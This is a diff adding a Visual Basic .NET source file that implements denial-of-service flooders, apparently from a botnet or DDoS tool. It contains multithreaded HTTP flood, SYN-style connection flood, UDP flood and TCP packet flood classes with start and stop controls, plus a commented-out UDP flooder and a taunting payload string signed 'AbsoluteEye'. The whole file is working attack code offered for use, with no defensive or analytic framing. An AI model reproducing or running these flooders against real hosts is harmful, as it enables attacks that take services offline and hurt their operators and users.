@@ -1,0 +1,428 @@
+﻿Imports System.Net
+Imports System.Threading
+Imports System.Net.Sockets
+Imports System.Text
+
+Module Flooder
+
+End Module
+'Public UDPNF As Boolean
+'Public attackIp As String
+'Public attackPort As String
+'Public Sub UDP_FLOOD()
+'    Do While UDPNF = True
+'        Dim UDPCLI As New Sockets.UdpClient
+'        Dim ips As IPAddress
+'        ips = IPAddress.Parse(attackIp)
+'        UDPCLI.Connect(ips, attackPort)
+'        Dim FloodData As Byte() = New Byte() {}
+'        FloodData = System.Text.Encoding.ASCII.GetBytes("6696969696969699999999j3960yj3409y3j69j36903j56930j6039j6y309j5y6039j56y093j56y0​93j56y093j56093j0956j039j6y309j56y093j3j30j9y5 - ")
+'        UDPCLI.Send(FloodData, FloodData.Length)
+'    Loop
+'    Do While UDPNF = False
+'        Exit Sub
+'    Loop
+'End Sub
+Friend Class HttpFlood
+    Private Shared _floodingJob As ThreadStart()
+    Private Shared _floodingThread As Thread()
+    Public Shared Host As String
+    Public Shared Interval As Integer
+    Public Shared IsEnabled As Boolean
+    Private Shared _requestClass As HttpRequest()
+    Public Shared Threads As Integer
+    Public Shared Sub StartHttpFlood()
+        _floodingThread = New Thread(Threads - 1) {}
+        _floodingJob = New ThreadStart(Threads - 1) {}
+        _requestClass = New HttpRequest(Threads - 1) {}
+        For i As Integer = 0 To Threads - 1
+            _requestClass(i) = New HttpRequest(Host, Interval)
+            _floodingJob(i) = New ThreadStart(AddressOf _requestClass(i).Send)
+            _floodingThread(i) = New Thread(_floodingJob(i))
+            _floodingThread(i).Start()
+        Next
+        IsEnabled = True
+    End Sub
+    Public Shared Sub StopHttpFlood()
+        For i As Integer = 0 To Threads - 1
+            Try
+                _floodingThread(i).Abort()
+                _floodingThread(i) = Nothing
+                _floodingJob(i) = Nothing
+                _requestClass(i) = Nothing
+            Catch p As Exception
+            End Try
+        Next
+        IsEnabled = False
+    End Sub
+    Private Class HttpRequest
+        Private Host As String
+        Private Http As New WebClient()
+        Private Interval As Integer
+
+        Public Sub New(ByVal Host As String, ByVal Interval As Integer)
+            Me.Host = Host
+            Me.Interval = Interval
+        End Sub
+
+        Public Sub Send()
+            While True
+                Try
+                    Http.DownloadString(Host)
+                    Thread.Sleep(Interval)
+                Catch
+                    Thread.Sleep(Interval)
+                End Try
+            End While
+        End Sub
+    End Class
+End Class
+Friend Class Syn
+    Private Shared _floodingJob As ThreadStart()
+    Private Shared _floodingThread As Thread()
+    Private Shared _ipEo As IPEndPoint
+    Private Shared _synClass As SendSyn()
+    Public Shared Host As String
+    Public Shared IsEnabled As Boolean
+    Public Shared Port As Integer = 80
+    Public Shared SuperSynSockets As Integer = 200
+    Public Shared Threads As Integer = 5
+
+    Public Shared Sub StartSuperSyn()
+        Try
+            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
+            _ipEo = New IPEndPoint(addressList(0), Port)
+        Catch
+            Dim address As IPAddress = IPAddress.Parse(Host)
+            _ipEo = New IPEndPoint(address, Port)
+        End Try
+        _floodingThread = New Thread(Threads - 1) {}
+        _floodingJob = New ThreadStart(Threads - 1) {}
+        _synClass = New SendSyn(Threads - 1) {}
+        For i As Integer = 0 To Threads - 1
+            _synClass(i) = New SendSyn(_ipEo, SuperSynSockets)
+            _floodingJob(i) = New ThreadStart(AddressOf _synClass(i).Send)
+            _floodingThread(i) = New Thread(_floodingJob(i))
+            _floodingThread(i).Start()
+        Next
+        IsEnabled = True
+    End Sub
+
+    Public Shared Sub StopSuperSyn()
+        For i As Integer = 0 To Threads - 1
+            Try
+                _floodingThread(i).Abort()
+                _floodingThread(i) = Nothing
+                _floodingJob(i) = Nothing
+                _synClass(i) = Nothing
+            Catch
+            End Try
+        Next
+        IsEnabled = False
+    End Sub
+
+
+    Private Class SendSyn
+        Private _sock As Socket()
+        Private ipEo As IPEndPoint
+        Private SuperSynSockets As Integer
+
+        Public Sub New(ByVal ipEo As IPEndPoint, ByVal superSynSockets__1 As Integer)
+            Me.ipEo = ipEo
+            SuperSynSockets = superSynSockets__1
+        End Sub
+
+        Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
+        End Sub
+
+        Public Sub Send()
+            While True
+                Dim num As Integer
+                Try
+                    _sock = New Socket(SuperSynSockets - 1) {}
+                    For num = 0 To SuperSynSockets - 1
+                        _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
+                        _sock(num).Blocking = False
+                        _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
+                    Next
+                    Thread.Sleep(100)
+                    For num = 0 To SuperSynSockets - 1
+                        If _sock(num).Connected Then
+                            _sock(num).Disconnect(False)
+                        End If
+                        _sock(num).Close()
+                        _sock(num) = Nothing
+                    Next
+                    _sock = Nothing
+                Catch
+                    For num = 0 To SuperSynSockets - 1
+                        Try
+                            If _sock IsNot Nothing Then
+                                If _sock(num).Connected Then
+                                    _sock(num).Disconnect(False)
+                                End If
+                                _sock(num).Close()
+                                _sock(num) = Nothing
+                            End If
+                        Catch
+                        End Try
+                    Next
+                End Try
+            End While
+        End Sub
+    End Class
+
+End Class
+Friend Class UDP
+    Private Shared _floodingJob As ThreadStart()
+    Private Shared _floodingThread As Thread()
+    Private Shared _ipEo As IPEndPoint
+    Private Shared _UdPcLass As SenduDp()
+    Public Shared Host As String
+    Public Shared IsEnabled As Boolean
+    Public Shared Port As Integer
+    Public Shared UDPzSockets As Integer
+    Public Shared Threads As Integer
+
+    Public Shared Sub StartUDPz()
+        Try
+            Dim addressList As IPAddress() = Dns.GetHostEntry(Host).AddressList
+            _ipEo = New IPEndPoint(addressList(0), Port)
+        Catch
+            Dim address As IPAddress = IPAddress.Parse(Host)
+            _ipEo = New IPEndPoint(address, Port)
+        End Try
+        _floodingThread = New Thread(Threads - 1) {}
+        _floodingJob = New ThreadStart(Threads - 1) {}
+        _UdPcLass = New SenduDp(Threads - 1) {}
+        For i As Integer = 0 To Threads - 1
+            _UdPcLass(i) = New SenduDp(_ipEo, UDPzSockets)
+            _floodingJob(i) = New ThreadStart(AddressOf _UdPcLass(i).Send)
+            _floodingThread(i) = New Thread(_floodingJob(i))
+            _floodingThread(i).Start()
+        Next
+        IsEnabled = True
+    End Sub
+
+    Public Shared Sub StopUDPz()
+        For i As Integer = 0 To Threads - 1
+            Try
+                _floodingThread(i).Abort()
+                _floodingThread(i) = Nothing
+                _floodingJob(i) = Nothing
+                _UdPcLass(i) = Nothing
+            Catch
+            End Try
+        Next
+        IsEnabled = False
+    End Sub
+
+
+    Private Class SenduDp
+        Private _sock As Socket()
+        Private ipEo As IPEndPoint
+        Private UDPzSockets As Integer
+
+        Public Sub New(ByVal ipEo As IPEndPoint, ByVal UDPzSockets__1 As Integer)
+            Me.ipEo = ipEo
+            UDPzSockets = UDPzSockets__1
+        End Sub
+
+        Private Shared Sub OnConnect(ByVal ar As IAsyncResult)
+        End Sub
+
+        Public Sub Send()
+            While True
+                Dim num As Integer
+                Try
+                    _sock = New Socket(UDPzSockets - 1) {}
+                    For num = 0 To UDPzSockets - 1
+                        _sock(num) = New Socket(ipEo.AddressFamily, SocketType.Stream, ProtocolType.Udp)
+                        _sock(num).Blocking = False
+                        _sock(num).BeginConnect(ipEo, New System.AsyncCallback(AddressOf OnConnect), _sock(num))
+                    Next
+                    Thread.Sleep(100)
+                    For num = 0 To UDPzSockets - 1
+                        If _sock(num).Connected Then
+                            _sock(num).Disconnect(False)
+                        End If
+                        _sock(num).Close()
+                        _sock(num) = Nothing
+                    Next
+                    _sock = Nothing
+                Catch
+                    For num = 0 To UDPzSockets - 1
+                        Try
+                            If _sock IsNot Nothing Then
+                                If _sock(num).Connected Then
+                                    Dim msg As Byte() = Encoding.UTF8.GetBytes("Hello server! Wanna lag a little please? By-AbsoluteEye")
+                                    Dim bytes As Byte() = New Byte(255) {}
+                                    _sock(num).Send(msg, 0, msg.Length, SocketFlags.None)
+                                    _sock(num).Disconnect(False)
+                                End If
+                                _sock(num).Close()
+                                _sock(num) = Nothing
+                            End If
+                        Catch
+                        End Try
+                    Next
+                End Try
+            End While
+        End Sub
+    End Class
+
+End Class
+Public Class TcpController
+    Public Shared isFlooding As Boolean = False
+
+    Shared targetList As New List(Of TcpCrusher)()
+
+    'Public Sub AddTarget(ByVal host As String, ByVal interval As Integer, ByVal usedThreads As Integer)
+    '    AddTarget(host, 200, interval, usedThreads)
+    'End Sub
+
+    Private Function ParseHost(ByVal host As String) As String
+        Dim addresslist As IPAddress() = Dns.GetHostAddresses(host)
+        Dim parsedIP As String = ""
+
+        For Each theaddress As IPAddress In addresslist
+            parsedIP = theaddress.ToString()
+        Next
+
+        Return parsedIP
+    End Function
+
+    Public Sub AddTarget(ByVal host As String, ByVal port As Integer, ByVal interval As Integer, ByVal usedThreads As Integer)
+        Dim parsedHost As String = ParseHost(host)
+        If [String].IsNullOrEmpty(parsedHost) Then
+            Throw New HostNotFoundException("")
+        End If
+
+        Dim hostEP As New IPEndPoint(IPAddress.Parse(parsedHost), port)
+
+        For i As Integer = 0 To usedThreads
+            targetList.Add(New TcpCrusher(hostEP, interval))
+        Next
+    End Sub
+
+
+    Public Sub Start()
+        For Each flood As TcpCrusher In targetList
+            flood.StartFlood()
+        Next
+    End Sub
+
+
+    Public Shared Sub [Stop]()
+        For Each flood As TcpCrusher In targetList
+            flood.StopFlood()
+        Next
+        Clear()
+    End Sub
+
+
+    Public Shared Sub Clear()
+        For Each flood As TcpCrusher In targetList
+            flood.Abort()
+        Next
+
+        targetList.Clear()
+    End Sub
+
+
+    Public Class TcpCrusher
+        Private t As Thread
+        Private flood As TcpFlood
+
+        Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
+            flood = New TcpFlood(host, interval)
+            t = New Thread(AddressOf flood.StartFlood)
+            t.Start()
+        End Sub
+
+        Public Sub StartFlood()
+            flood.IsFlooding = True
+            isFlooding = True
+            flood.StartFlood()
+        End Sub
+
+        Public Sub StopFlood()
+            flood.StopFlood()
+        End Sub
+
+        Public Sub Abort()
+            Try
+                flood.StopFlood()
+                flood.IsFlooding = False
+                t.Abort()
+            Catch
+            End Try
+        End Sub
+
+        Public Class TcpFlood
+            Private client As Socket
+            Private _host As IPEndPoint = Nothing
+            Private _interval As Integer
+
+            Private _IsFlooding As Boolean
+            Public Property IsFlooding() As Boolean
+                Get
+                    Return _IsFlooding
+                End Get
+                Set(ByVal value As Boolean)
+                    _IsFlooding = value
+                End Set
+            End Property
+
+            Public Sub New(ByVal host As IPEndPoint, ByVal interval As Integer)
+                _host = host
+                _interval = interval
+                client = New Socket(_host.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
+            End Sub
+
+            Public Sub StartFlood()
+                If Not client.Connected Then
+                    client.Connect(_host)
+                End If
+                IsFlooding = True
+                IsFlooding = True
+                Flood()
+            End Sub
+
+            Public Sub StopFlood()
+                If client.Connected Then
+                    client.Close()
+                End If
+                IsFlooding = False
+                IsFlooding = False
+            End Sub
+
+            Private Sub Flood()
+                While IsFlooding
+                    Dim packet As Byte() = New Byte(1469) {}
+                    Try
+                        client.SendTo(packet, _host)
+                    Catch
+                    Finally
+                        Thread.Sleep(_interval)
+                    End Try
+                End While
+            End Sub
+        End Class
+    End Class
+End Class
+<Serializable()> _
+Public Class HostNotFoundException
+    Inherits Exception
+    Public Sub New()
+    End Sub
+    Public Sub New(ByVal message As String)
+        MyBase.New(message)
+    End Sub
+    Public Sub New(ByVal message As String, ByVal inner As Exception)
+        MyBase.New(message, inner)
+    End Sub
+    Protected Sub New(ByVal info As System.Runtime.Serialization.SerializationInfo, ByVal context As System.Runtime.Serialization.StreamingContext)
+        MyBase.New(info, context)
+    End Sub
+End Class
